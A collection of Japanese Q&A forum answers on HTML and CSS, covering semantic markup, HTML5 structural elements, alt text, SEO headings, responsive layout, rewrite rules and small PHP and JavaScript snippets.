＞黒の部分はテーブルの部分です。 　想像通りだったようです。 　急ぎませんので、No.1,No.2を徹底的に読んで理解してから、画像サイズやalt(画像が表示されないユーザー、視覚弱者に読み上げる、検索エンジンに伝える)９つすべてについて補足してください。 　No.2のHTMLをとりあえず表示してみると、No.1,No.2で言っていることがわかるはずです。 　⇒ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　のサイトを(Chrome以外の)ブラウザで表示して、メニュー⇒スタイルシート⇒で色々なスタイルを選択してみてください。文書構造だけをHTMLに書きなさいといった意味が分かるかと・・ 　それさえしてあければ、くっつけようが離そうが他の背景画像を使おうが自由自在になるのですから・・・tableは使ったらダメです。 　
No.2、No.3です。 一応補足しておきます。 私はデザイン案のロゴマークにある部分がヘッダーだと思ったので、 <header> ロゴマーク </header> <nav> ABOUT WORKS </nav> <section> コンテンツ </section> No.3の、このように分割しました。 しかし、ロゴマークはヘッダーではなくナビゲーションの一部だと思われたのであれば、 <nav> ロゴマーク ABOUT WORKS </nav> <section> コンテンツ </section> としたり、ロゴマークはコンテンツではないと思われるのであれば、背景画像などにして作る事になると思います。 <nav style="background-image:ロゴマーク"> ABOUT WORKS </nav> <section> コンテンツ </section> これらの作り方の違いは最初に書いたような考え方の違いによる物ですし、実際にHTMLコーダーごとに違います。 （それが意図した分類かどうかはともかくとして。） HTMLの文法では「ヘッダーに<header>をつける」ということは規定されていますが、 「このページのどこがヘッダーなのか」というのは、HTMLで規定される物ではなく、概ね制作者の心情、信念、または宗教的な思考による物ではないかと思います。 文書にヘッダーを付けることは義務ではありません。 ただ、この文書は何の文書か、このサイトはどういうサイトかというのを書こうとすると、結果的に、一般的に "ヘッダー" と呼ばれているものになると思います。 （それでもヘッダーではない、というのであれば、私はそれを否定しません。） 『結果的に、一般的に "ヘッダー" と呼ばれているもの』を見せたくないのであれば、 <header style="display:none"> ヘッダー </header> <nav> ロゴマーク ABOUT WORKS </nav> <section> コンテンツ </section> という書き方もできます。
どのようなことを想定しているか、質問内容では判断ができませんが、あくまでも一般論で回答させていただくことをご了承ください。 Android OSのスマートフォンだと、普通は「Googleカレンダー」の専用アプリをインストールさせてから表示させるですけど・・ Googleカレンダー - Google Play の Android アプリ https://play.google.com/store/apps/details?id=co …
　もっとも良いのは、画像が表示されるべき場所で右クリック(コンテキストメニュー)から画像だけを表示でURLと画像を確認してみる。 　例えば半角と全角とか、そのパスに画像がないとかです。
大抵の場合、契約しているプロバイダが提供する 無料のＨＰスペースがあるはずです にも関わらず、あなたがわざわざ FC2 でＨＰを 運用している理由は何ですか？ CGIやPHPが使えないからとか、であれば 有料ならそれこそ、何でもできます 基本ブログしかしない、設定とか難しいし とかであれば例えば私が利用している有料サーバーであれば 簡単にブログを設置できる、簡単にネットショップを経営できる 簡単にＳＮＳサイトを設置できる等のツール類も充実しています 仲間とメーリングリストもできますし 仲間にまとめてメールマガジンを発行する事もできます 何よりメールアドレスがいくつでも作れます 懸賞サイトに応募したらスパムの様にメールが送られてくる なんてならないように 懸賞サイト名＠独自ドメイン のメールを作って、 それで応募して、もしスパムが来たなら、そのメアドからどの懸賞サイト からの流出かもわかる。なんて事も良くやります 金額は私の場合、（年間 3000円程 ＋ 独自ドメイン年間 1000円程） 計年間 4000円程は学生さんには厳しいかも知れないですが ＨＰの作成に飽きて、とりあえずメールだけの為に年4000円捻出している 状態であっても、いつでもＨＰ作成に戻る事ができます 無料は何ヶ月か更新がなければ消えますから 気長に出来るのもメリットです
検索・フィルタリング結果に URL (動的・静的問わず) で直接 アクセスできるようになっていないと無理です。 あなたのサイトに URL でアクセスしようとした場合、 ・ index.php にしかリンクを張りようがない ・ index.php に最初にアクセスすると検索フォームしか 　出てこない わけですよね？ それではインデックスのしようがありません。 せめて、『 URL　index.php?filter=AAA　にアクセスしたら、AAA でフィルタした結果を表示する』 ような仕組みにしておく必要が あります。そのような仕組みにできれば、あとは10万件のページ 全ての URL を一覧表示するサイトマップページを作ればいけ ますね。
　ウェブページの基本は、御存知だと思いますが「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」でしたね。 　画像は必ずalt属性を記述されているはずです。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 非テキスト系の要素である、IMG、AREA、 APPLET、INPUT要素は、著者に対し、当該要素が順当にレンダリングされない場合の要素内容として提供される代替テキストを指定することを求める。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Objects, Images, and Applets in HTML documents( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　ですので、何もしなくても画像にポインターを合わせれば通常のブラウザはaltの内容を表示するはずです。 <p class="withMessage"> <img width="300" height="188" alt="富士山の写真" title="富士市より眺めた晴天時の富士山" src="http：//upload.wikimedia.org/wikipedia/ja/thumb/3/3e/MtFuji_FujiCity.jpg/300px-MtFuji_FujiCity.jpg"> </p> ・・・・wikiの画像です。:は：に置換してあるので戻すこと。メッセージ付だとclassで説明してあります。次の説明でこれを使用します。 　(注)class属性を併用することで、文書に構造を付加することができます。 説明書きのある写真でしたら、次のようにマークアップされていると思います。 <div class="figure"> 　　<img width="300" height="188" alt="富士山の写真" src="http：//upload.wikimedia.org/wikipedia/ja/thumb/3/3e/MtFuji_FujiCity.jpg/300px-MtFuji_FujiCity.jpg"> 　　<div class="figcaption"> 　　　<p>富士市より眺めた晴天時の富士山</p> 　　</div> </div> ※DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ※HTML5では、このHTML4.01の説明が守られなかったため新しい要素が追加されました。 　http://standards.mitsue.co.jp/resources/w3c/TR/h … 　ここでは、その名称と用途をclass名にしています。HTML5では 　<figure> 　　　<img width="300" height="188" alt="富士山の写真" src="http：[略]"> 　　　<figcaption> 　　　　<p>富士市より眺めた晴天時の富士山</p> 　　　</figcaption> 　</figure> となります。 これにたいして、 div.figure{ /* 挿絵のブロック*/ position:relative; } div.figure div.figcaption{ position:absolute; top:0;left:0; opacity:0.6; background-color:white; display:none; } div.figure:hover div.figcaption{display:block} とか、 時間が取れたら簡単なサンプルつくってみます。
＞SEO対策の為にH1タグにサイトの説明を入れてるのですが 　検索エンジンを騙すような事はしない。これがSEOの原則ですが・・・ 　<h1>見出しレベル1</h1>は、その文書の見出しとなるテキストを入れます。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 見出しの要素は、その章・節で述べられる話題を短く記すものである。見出し情報は、ユーザエージェントによって、例えば文書の目次を自動生成するために用いられたりもするであろう。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから These elements have a rank given by the number in their name. The h1 element is said to have the highest rank, the h6 element has the lowest rank, and two elements with the same name have equal rank. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.3 Sections — HTML5( http://www.w3.org/TR/html5/sections.html#the-h1, … )］より 　<title></title>と同じものを入れておくのがSEO上では最適です。その文書の説明などでしたらDIV要素を「id属性及び class属性と併用することで、文書に構造を付加( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」します。 　SEOに関心があるなら、説明と言うか、そのページの要約でしたら当然 <div class="header"> 　<h1>構造とプレゼンテーションの分離</h1> 　<div id="abstract"> 　　<h2>要約</h2> 　　<p> 　　　<abbr title="Hyper Text Markup Language">HTML</abbr>において<stong>文書構造とプレゼンテーションの分離</strong>は最も重要です。詳しくは<a href="http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 …構造とプレゼンテーションの分離</a>にあります。 　　</p> 　</div> </div> 　とマークアップされていると思います。これだと検索エンジンに「その文書のheaderに何が記述されているか」とか「要約がどこか」がすぐ理解できますよね。 　ただ、そうであっても、プレゼンテーション上控えめにしたい場合は、h1{font-size:14px;}とかはスタイルシートで指定すれば良いです。 　検索エンジンには、きちんと文書構造をマークアップしてヒントを与えて、ページの内容を正確に理解させること。これがSEO(検索エンジン最適化)の基本中の基本です。 　それをどのようにプレゼンテーションするかは、スタイルシートで行います。(無指定だとブラウザのデフォルトのスタイルシートが使われます。)
absoluteでmargin: 0 auto;意味無いです。 そのまえに、例でないとしたらそのようなHTML書かないほうが良いです。 divは必要最小限に、使うときは「文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」に使用します。 　先でボタングループ以外でデザインしようとしたら不釣合いですし、そもそもHTMLのメンテナンスだ大変になる。 <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<div class="nav"> ＿＿＿<ol> ＿＿＿＿<li><a href="/">Top</a></li> ＿＿＿＿<li><a href="/Prodacts">製品</a></li> ＿＿＿＿<li><a href="/News">ニュース</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="section"> ＿＿<h2>本文</h2> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿</div> </body> このような場合、absoluteは使うべきではありません。他の要素と切り離されて、後続の要素はその要素は存在し無いように振舞います。 単純に div.header,div.section,div.footer{ width:80%;max-width:780px;min-width:600px; margin:0 auto; padding:10px; } div.header div.nav{ width:83%;min-width:780px; margin:0 auto; text-align:center; min-height:200px; } /* だけで期待通りになるはず、しかもリキッドですからスマホも幅広ディスプレイもＯＫ */ /* ウィンドウ幅狭かったり、視覚障害者がフォントを拡大しても追随してくれる */ /* 色をつけておくと */ body{background-color:gray;} div.header,div.section,div.footer{background-color:#3F3;} div.nav{background-color:#C63;} ちなみに ・classにしたのは、header,section,footerはページ内に何度も登場しうるので 　class名はHTML5の新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … )とその用途ですから、HTML5にするときは <body> ＿<header> ＿＿<h1>タイトル</h1> ＿＿<nav> ＿＿＿<ol> ＿＿＿＿<li><a href="/">Top</a></li> ＿＿＿＿<li><a href="/Prodacts">製品</a></li> ＿＿＿＿<li><a href="/News">ニュース</a></li> ＿＿＿</ol> ＿＿</nav> ＿</header> ＿<section> ＿＿<h2>本文</h2> ＿</section> ＿<footer> ＿＿<h2>文書情報</h2> ＿</footer> </body> になるだけ。 　せっかくデザインをスタイルシートで行うのですから、HTMLは文書構造だけ記述するので楽になるはずです。 ⇒構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
JSFを使っているなら、h:selectOneListbox か h:selectManyListboxを使います。 参考URL：http://ameblo.jp/kurabeat/entry-10588827749.html
出力・非出力の制御じゃなくて、表示・非表示の設定ですよね？ であればstyle属性にdisplay:noneを付加するような出力にするか idに対してcssで非表示を渡すようなスタイルシートをjavaで出力してみては？
まだいますか？いるのなら回答しますが。
<div>は段落のまとまり、つまり、文章のまとまり、そこに文章がない！・・・おかしく思いませんか？ この要素以前の文面に、空間を作るための、装飾要素（padding margin)を設けることです。 ただし、装飾要素なので、HTMLに記述してはいけません！ 必ず、CSSに記述しましょう。 ＶａｌｉｄなＨＴＭＬを記述するには、validatorなどを利用されているとおもいますが、まずは仕様書を、熟読されることです。 　　　　↓↓↓↓↓↓↓↓↓↓↓↓ で、紹介・指摘されている意味も理解できると思います。 参考URL：http://validator.w3.org/
HTML4.01以降は、id属性をリンクターゲットにすることが出来ます。 サンプル ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- div.footer{margin-top:100%;} table[summary="テスト"]{ border-collapse:separate; border:gray solid 10px; line-height:2em; } table[summary="テスト"] th,table[summary="テスト"] td{ border-top:solid 20px yellow; width:5em; padding:0 1em; height:50px; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<ul> ＿＿＿<li><a href="#A">あ</a></li> ＿＿＿<li><a href="#KI">き</a></li> ＿＿＿<li><a href="#SU">す</a></li> ＿＿＿<li><a href="#TE">て</a></li> ＿＿＿<li><a href="#NO">の</a></li> ＿＿</ul> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<table summary="テスト"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="あ行" id="A">あ</th><td>い</td><td>う</td><td>え</td><td>お</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="か行">か</th><td id="KI">き</td><td>く</td><td>け</td><td>こ</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="さ行">さ</th><td>し</td><td id="SU">す</td><td>せ</td><td>そ</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="た行">た</th><td>ち</td><td>つ</td><td id="TE">て</td><td>と</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="な行">な</th><td>に</td><td>ぬ</td><td>ね</td><td id="NO">の</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
　excelのWeb出力は、excelを持っていない人でもとりあえずtableにして閲覧できるようにするためでしかありません。 　そのため、一切の装飾がない状態に戻してtabelにするほうが良いです。 毎回同じ行数、列数でしたら、隣接セレクタ、nth-chlldセレクタでデザインできます。 　私は、それとは別の方法ですが ・csvで受け取って、テキストエディタのマクロでtableを作る ・.xlsxをXMLとしてXSLTでHTMLにする ・PerlでCSVファイルを元にHTMLを作成する の何れかを状況によって使い分けています。 　どの方法が良いかは、もう少し具体的な状況がわからないと
$_GET['id']を見て無ければtest.php?id=5へリダイレクト。 test.php?id=1はそのままであればhtaccessを使わず、以下のような感じでうまくいきませんかね？ if ( !isset($_GET['id']) ) { header('Location:test.php?id=5'); exit; }
私も Dreamweaver は使ってないので、「強制終了」の原因はわかりませんが、 「Dreamweaver 強制終了」で検索してみたけど、なんかキャッシュ周りやファイルサイズがちょっと肥大化したくらいで不具合でまくるらしいですね。 html的には pre要素の内部といえども、不等号 <> の文字はタグ解釈するので、html としては文法エラーです。最近のブラウザでは、不明タグとして表示しないか（表示は崩れる）、すぐ後方に半角スペースがあれば、文字とみなしてくれるようですが。 既に回答のあるように、文字実体参照を使うか、不等号記号や&をそのまま埋め込んでも html として問題ないのは、form要素の<textarea>です。 <textarea rows="2" cols="50" readonly> 不等号表示 a > b && c<=d || e<p <x> &lt; &gt; &amp; </textarea> 送信文字としてそのままのテキストデータを送るための配慮のようですけど、逆手にとって、プログラムコードやhtmlソース表示用に利用したりしてます。 表示の装飾にやや制限は付きますが。
どのくらい堅牢なアクセス制限をしたいかによりますが、なんとなくならできます。すでに回答がありますね。ただ、それ以外のユーザーには絶対に表示させたくないという種類のものの場合は、端末を特定することも、地域を限定することも、不可能です。どちらも簡単に偽装できます。つまり、そんなアクセス制限は簡単に突破できるということです。
システムの環境ってなんでしょうか。 誰がつくったものなんでしょうか。 対応内容はいわゆるフロントエンド(デザイン/html/css/javascript)の範囲を超えています。つまり、バックエンドを担当した、システムをつくった側が対応すべきです。もし、あなたの会社の前任、あるいはもう取引のない外注がつくったのであれば、それは偏に会社の責任です。それなりのコストを出してシステムを改変してください。また、楽天などのサービス上の話であれば、単にそんなサービスからは撤退してください。なぜならば対応不可能だからです。
マイクロソフトのワードにもスタイル機能があることをご存知でしょうか? ワードでは、文字スタイルと段落スタイルと2種類のスタイルがあります。 その名の通り、文字に対してのスタイルと、段落に対してのスタイルです。 で、気になるのが、文字と段落の違いですね。 ワードでは行頭から改行までを「段落」と位置づけています。 つまり、文字に対しての装飾と、段落に対しての装飾ではいろいろ違ってくる部分があります。 HTML/CSSも同様の考え方です。 HTML/CSSでは、段落をブロックレベル要素、文字をインライン要素と言います。 ここまで分かれば、もう検索したほうが早いです。 「css インライン要素」でどうぞ。
質問内容からして、おそらく趣味の範囲でホームページをつくられているかと想像します。結論から言うと、趣味の範囲であれば、どのようにつくっても何の支障もありません。SEOの不利もありません。 ただ、Web制作を本業とするならば、作業の効率化を求めます。ディレクトリ構成を見た時に、直感的に理解できないファイル群は、制作的に恐ろしく非効率です。つまり、制作にコスト(手間)がかかるということです。一般的ではない構造ですね。
RewriteRule search/(.*) cgi/search/$1 [L] ##正常に動作 RewriteRule ^search/([0-9]+)$ cgi/search/navi.cgi?mode=kt&kt=$1 RewriteRule ^search/([0-9]+)/$ cgi/search/navi.cgi?mode=kt&kt=$1 については、2つ目、3つ目のルールは1つ目のルールに内包されてしまいますので、1つ目のルールにマッチして処理されてしまっていると思われます。 ルールの記述の順番を変えてあげればいけるのではないでしょうか。
IE8以下を使うユーザー割合は、XPかVistaで、かつ、パソコンやインターネットをあまりよく知らない層が占めています。また、ご存知のようにXPのサポートは今年の4月で終了します。あなたの個人サイトであれば、割りきって捨てても支障がないと思います。 あなたが誰かのサイトを作っているのであれば、あと半年～1年くらいは様子を見て、対応したほうがよいかもしれませんね。
簡単にやるなら <div style="text-align:center">ううう</div> ちょっと論理的にやるなら p.特に読者に訴えかけたい標語の段落 { text-align:center } <p class="特に読者に訴えかけたい標語の段落">ううう</p> 記事内の小見出しを全部寄せたいなら article > h6 { font:略; text-align:center } <article> <h6>ううう</h6> 複数行を中央寄せするなら ul.詩 li { list-style:none; text-align:center } <ul class=詩> <li>雨ニモマケズ <li>風ニモマケズ <li>雪ニモ夏ノ暑サニモマケヌ <li>丈夫ナカラダヲモチ ... </ul>
ユーザビリティのために、点線枠は表示されます。 どのブラウサでもそうなるはずです。 　これは、マウスではなく障害者がタブキーでフォーカスを移動した時にどこが現在地かを示す重要なインターフェースです。 ★ですから、消すのは望ましくありません。健常者だけがサイトを利用するわけじゃない!! 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　それを消したければ onfocus=”this.blur()" 　また、 botton{outline:none;} 　しかし、それは残しておくことを強くお勧めします。
質問の意味が理解できないのですが・・・・・ HTMLで取得して、テキストで表示するのは無理なのでは？・・・ ＣＳＳの適用がそれぞれちがうのでは？・・・ HTMLは、すべてテキストファイルなので、テキストで取得し、独自のCSSで対応するということでしょうか？ その場合は、<body><artcle><section id=""><hn></hn><p></p></section></artcle></body>という構成になると思いますが？・・・ htmlの場合、ブラウザが自動的に対応するので、幅の設定は必要ないのでは？・・・ 閲覧者の環境に自動対応するのがhtmlの特徴です。 画像の場合も、widthとheightを、記述しなければ、自動的に対応できるのでは？・・・ やりたいことがわからないので、ピントがぼけているかも？
ですね。 回答No4様の言う通りです。 とは言え、それはそーなんですが、以前テレビでGoogleの技術者が言っておりましたが、 「みんながみんな、HTMLのマークアップやCSSの良き理解者であればいいのですが、それは極少数派で、PCに詳しくない方もWebサイトを作ったり公開したりすることは自由だし、またどんな作り方をしてもブラウザ側で処理して表示されるなら、それはそれで良いと思う。また、もしその自由な表現をだめにしたら、ここまでWebは発展しなかっただろう。。。」 的な事を言っていたことを思い出します。 しかし、自分のプライベートなサイトでしたら、どんなんであろうが良いとは思いますが、仕事でお客様のサイトを作ることであれば、話は別です。 CEO対策や、今後拡大されるであろうサイトの拡張化、複数な人によるサイト管理や制作などなど、HTMLとCSSを別にすること(当たり前)は重要なひとつです。膨大なサイトを作る上で、圧倒的に作業が容易です。
HTMLの基本は <body> 　<head> 　 ・・・このHTML文書のヘッダ・・(画面には表示されない) 　　スタイルシートやmeta情報などはここに書かれます。 　</head> 　<body> 　　・・・本文 　</body> </html> です。 　header要素は、HTML5で登場した本文中の導入部やナビゲーションをグループ化する要素です。 　HTML4.01～XHTML1.1でページを作成されていたと思いますが、それらには文書構造を示す要素がありませんでした。文書構造は 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』と、明記してあった!! 　そのため、 <body> 　<div class="header"> 　　導入部やナビゲーション 　</div> 　<div class="section"> 　　本文 　</div> 　<div class="footer"> 　　文書情報など 　</div> </body> とマークアップされてきたと思います。 　ところが、仕様書をろくに読まない人が多く。 <body> 　<div id="top"> 　　導入部やナビゲーション 　</div> 　<div id="content"> 　　本文 　　<div id="leftMenue"> 　　</div> 　</div> 　<div id="bottom"> 　　文書情報など 　</div> </body> のように、文書構造ではなくプレゼンテーション的なidやクラス名を使用する人があとをたちません。 　それでは、何のためのHTMLかわからない。検索エンジンは無論、だれにも何処が導入で、本文で、本文と関係ないのかさっぱり分からない!! 　その反省から、 ★HTML5 では、文書をよりよく構造化するために、次の要素が新しく追加されました。( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) section、article、aside、hgroup、header、footer、nav、figure、figcaption 　★hgroupは採用されない見込み 　★アウトラインには影響しない、一箇所しかつかえないがmain要素が追加見込み ということです。 　ですから、従来　1999年のHTML4.01の勧告以来・・ <body> 　<div class="header"> 　　<h1>ページタイトル</h1> 　　<div class="nav"> 　　　<ol>ナビゲーションリスト</ol> 　　</div> 　</div> 　<div class="section">本文ブロック</div> 　<div class="footer">文書情報</div> </body> 　・・・・と書かれてきたと思いますが、それを <body> 　<header> 　　<h1>ページタイトル</h1> 　　<nav> 　　　<ol>ナビゲーションリスト</ol> 　　</nav> 　</header> 　<section>本文ブロック</section> 　<footer>文書情報</footer> </body> と書きなさいという事です。 <head>はHTML文書のヘッダで表示されない情報 <header>は、本文のうち「導入部やナビゲーション」をまとめる要素
#1さんのおっしゃるようにスタイルシートを少し勉強してみれば、デザインの幅がぐっと広がります。ご提示の要素がよくわからないので、とりあえず<p>で説明しますが、スタイルシートはpがdivになっても、同じように扱えます。htmlが文章構造担当で、スタイルシートが見た目担当です。 line-heightは行間の意味です。その後ろの数字をtzennlfagx さんの好きな数値にしてみてください。 １．タグ的にインラインに入れ込むなら------------ <p style="line-height:1.8em">秋の田の かりほの庵の 苫をあらみ<br> わが衣手（ころもで）は 露にぬれつつ</p> <p style="line-height:1.1em;">「かりほ」は、「仮庵」と「刈り穂」の意味を持つ掛詞<br> 「仮庵の庵」で重ね詞 。<br> 農民の歌であるとか恋の歌であるなどの解釈がある。</p> ------------------------------------------ ２．<p style="line-height:1.1em;">head内に入れて何回も繰り返す事も可。別ファイルにして、サイト全体を制御するのが一般的。ここでは簡単にできる<head>内に入れる方法を。</head>のすぐ上にでも入れてみてください。 ------------------------------------------- <style type="text/css"> .tanka{line-height:1.8em;} .kaisetu{line-height:1.1em;} </style> </head> body内は----------------------------------- <p class="tanka">秋の田の かりほの庵の 苫をあらみ<br> わが衣手（ころもで）は 露にぬれつつ<br> </p> <p class="kaisetu">「かりほ」は、「仮庵」と「刈り穂」の意味を持つ掛詞<br> 「仮庵の庵」で重ね詞 </p> <p class="tanka">大江山いくのの道の遠ければ<br> まだふみも見ず天の橋立</p> <p class="kaisetu">まだふみも見ず天の橋立<br> ふみは「文」と「踏み」の掛詞</p> ------------------------------------------- ３．いろいろできる。 上の例ではclassごとの見た目を指定していますので、行間だけでなく、文字を大きくしたい、背景色を変えたいなどの要求が出てきたら、body内はそのままで、デザインの要素をどんどん増やせます。 head内ーーーーーーーーーーーーーーー 上記.tanka{line-height:1.8em;}を .tanka{line-height:1.8em;font-size:2em;background:#cccccc;}に変えてみてください。 ーーーーーーーーーーーーーーーーーー 今はわからなくても、スタイルシートに興味を持ってもらえれば、幸いです。
CSSは外部リンクですか？ HTMLファイルの文字コードが「UTF-8」なら CSSファイルの先頭に、「@charset "UTF-8";」 を記述してみてはいかがでしょうか？ もし、それが違ったら、 CSSの記述におかしなところはありませんか？
<pre>タグ以外では、 半角スペースは、1行に連続して入れても1つ以上は無視されます。 よって、意図的に半角スペースを連続していれた意場合は、 半角スペース ＝ なので「」を連続で記述すれば、いかがでしょうか？ スマホで検証してないのでわかりませんが。。。。 ▼ソース 文字文字
テーブルの幅がviewportで指定した幅より広いということでしょうか。 たとえばA4用紙をB5のレターケースに入れる事はできないように、 幅が広い要素を作ったのなら、viewportも相応に大きくしないと無理です。 viewportを515pxにしたいのなら、テーブルを515px以内に収まるように作らないと無理です。
プリンター自体が１ページ目と２ページ目を連続して用紙選択が出来るのですか？ 一枚ずつ印刷することになります。 ２枚目は、A5用紙、横向きですよね。CSS2.1以降、規格はあるのですが対応しているブラウザは少ないです。Operaは対応が進んでいます。
vbscript って最近のIEでは使えなくなった様なので、 javascript で回答します <input type="button" onclick="a=parseInt(this.getAttribute('data-count'));a=isNaN(a)?1:a+1;alert(a+'回押しましたね');this.setAttribute('data-count',a)" value="Please"> もう少し綺麗にするなら <script> _=0; window.onload = function(){ _ ; document.getElementById('countTarget').onclick = function(){ _ , _ ; var a = parseInt(this.getAttribute('data-count')); _ , _ ; a = isNaN(a)? 1: a+1; _ , _ ; alert(a + '回押しましたね'); _ , _ ; this.setAttribute('data-count', a); _ ; }; }; </script> <button id=countTarget>Please</button> 汎用的にするなら <script> _=0; addEventListener('load', function(ev){ _ ; [].slice.apply(document.querySelectorAll('button.counting')).forEach(function(e){ _ , _ ; e.addEventListener('click', function(evt){ _ , _ , _ ; var a = parseInt(this.getAttribute('data-count')); _ , _ , _ ; a = isNaN(a)? 1: a+1; _ , _ , _ ; alert(a + '回押しましたね'); _ , _ , _ ; this.setAttribute('data-count', a); _ , _ ; }, false); _ ; }); }, false); </script> <button class=counting>Please1</button> <button class=counting>Please2</button>
＞同じサイトをスマホで見ると、字が小さくて読めません。 　作り方がまずい(^^) 　そもそもHTMLは、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 ・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　その大原則を守っていれば、「同じサイトをスマホで見ると、字が小さくて読めません。」はないはずですね。 ＞教えてｇｏｏのように、 　「教えて!goo」はOKWave( http://www.okwave.co.jp/index.html )のシステムを利用している関係で、とても古い手法ですので参考にはならないでしょう。HTTP要求ヘッダのuser-agentで動的に出力されています。次々に登場する新しいuser agentに対応し切れていません。 [対策] ・リキッドデザインで製作する 　100%基準で--640px～1000px程度に伸縮、スマホだと縦置きの場合その幅に縮小されるが横置きだと640px、幅広ディスプレイだと1000pxまで伸びる。 ・それで足りない場合や、ユーザーインターフェースを変えるときはmediaQueryでスタイルシートを切り替える。 　が基本です。そうして置けば、スマホかパソコンじゃなく『様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器』さらに、プリンターや、検索エンジンにも対応するウェブページができる。 以前紹介した 　⇒ブログテンプレート作り　CSSで困ったことが・・・ - ホームページ作成ソフト - 教えて！goo( http://oshiete.goo.ne.jp/qa/8455241.html ) 　のHTMLを試してご覧なさい。 　 　
なんらかの別のスタイルシートが邪魔しているのでは？ その設定だけ書いたhtmlではどうですか？ <html> <head> <style> th.test1 { text-align: center; width: 100px;border:1px solid #000000;} </style> </head> <body> <p> <table> <tr> <th class="test1">日付</th> </tr> </table> </p> </body> </html>
table内に画像とはあまり無いと思いますが？？？ tableは二次元以上のデータを整列させるためのものでデザイン用とではありません。そのため、img要素のような置換インライン要素を含めセル内の要素に合わせて伸縮すべきです。 「単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　どういう文書構造か分かりませんが・・画像へのリンクでしたら <ol> 　<li><a href=""><img src="" width="" height="" alt=""></a></li> 　<li><a href=""><img src="" width="" height="" alt=""></a></li> 　<li><a href=""><img src="" width="" height="" alt=""></a></li> ・・・ </ol> とマークアップしておけば良いのでは？？ zoom: というプロパティは存在しません。
